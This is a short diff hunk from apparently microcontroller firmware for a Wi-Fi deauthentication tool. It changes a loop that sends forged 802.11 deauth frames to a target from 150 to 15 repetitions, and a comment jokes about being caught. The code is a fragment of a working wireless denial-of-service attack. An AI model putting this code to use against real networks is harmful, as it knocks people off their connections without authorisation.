@@ -106,8 +106,8 @@ void Deauth::start() {
     uint8_t* deauthPacket = new uint8_t[packetSize];
     construct(deauthPacket, destinationMAC, sourceMAC, bssid, sequenceNumber, reasonCode);
 
-    // send the deauth 150 times(ur cooked if they find out)
-    for (int i = 0; i < 150; ++i) {
+    // send the deauth 15 times(ur cooked if they find out)
+    for (int i = 0; i < 15; ++i) {
         Raw80211::send(deauthPacket, packetSize);
         Serial.println("(>-<) Deauth packet sent!");
         delay(100);
